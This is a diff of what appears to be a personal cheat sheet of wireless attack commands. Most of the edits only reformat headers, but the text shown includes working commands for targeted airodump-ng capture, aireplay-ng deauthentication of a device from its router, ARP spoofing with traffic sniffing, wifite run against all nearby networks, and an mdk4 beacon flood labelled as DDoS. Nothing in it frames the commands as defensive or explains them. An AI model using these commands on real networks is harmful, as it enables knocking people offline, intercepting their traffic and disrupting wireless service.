@@ -77,7 +77,7 @@ airodump-ng wlan0 -c 11 ## use to monitor local APS
 max
 
 
------------------------------------------------------[WHOS CONNECTINIG TO ME]---------------------------------------------
+--------------------------------------------------[WHOS CONNECTINIG TO ME]------------------------------------------
 [netscanner]
 [angry ip scanner]
 [netdiscover]
@@ -106,7 +106,7 @@ arp.spoof on
 set net.sniff.local true
 net.sniff on
 
------------------------------------------------------[DISCOVER / DEAUTH USERS]---------------------------------------------
+---------------------------------------------[DISCOVER / DEAUTH USERS]---------------------------------------------
 
 [WASH: networks using the monitor mode interface-- such as printers]
 sudo wash -i wlan2 -c 6 
@@ -119,18 +119,17 @@ aireplay-ng --deauth 0 -c [DEVICES MAC ADDRESS] -a [ROUTERS MAC ADDRESS] wlan0mo
 sudo wifite -all
 
 # Targeting everying near by
-airodump-ng wlan0
 #  Specific Targeting for better information gathering
---> also shows devices (mac) within the station
-* airodump-ng -c11 -w airdump.txt -d 50:C7:BF:DC:4C:E8 wlan0
+--> 
 
+----------------------------------------- [BEACON FLOOD - DDOS]
 
-###############################
+sudo mdk4 wlan0 b "living room"
+airodump-ng wlan0
+[shows devices (mac) within the station]
+airodump-ng -c11 -w airdump.txt -d 50:C7:BF:DC:4C:E8 wlan0
 
-[Broadcast / Monitor Mode] 
-sudo ifconfig wlan0 down
-sudo iwconfig wlan0 mode monitor
-sudo ifconfig wlan0 up
+-----------------------------------------[AIRO-DUMP]---------------------------------------
 
 [wifi scan]
 sudo airodump-ng -w wider_scan_capture wlan0 
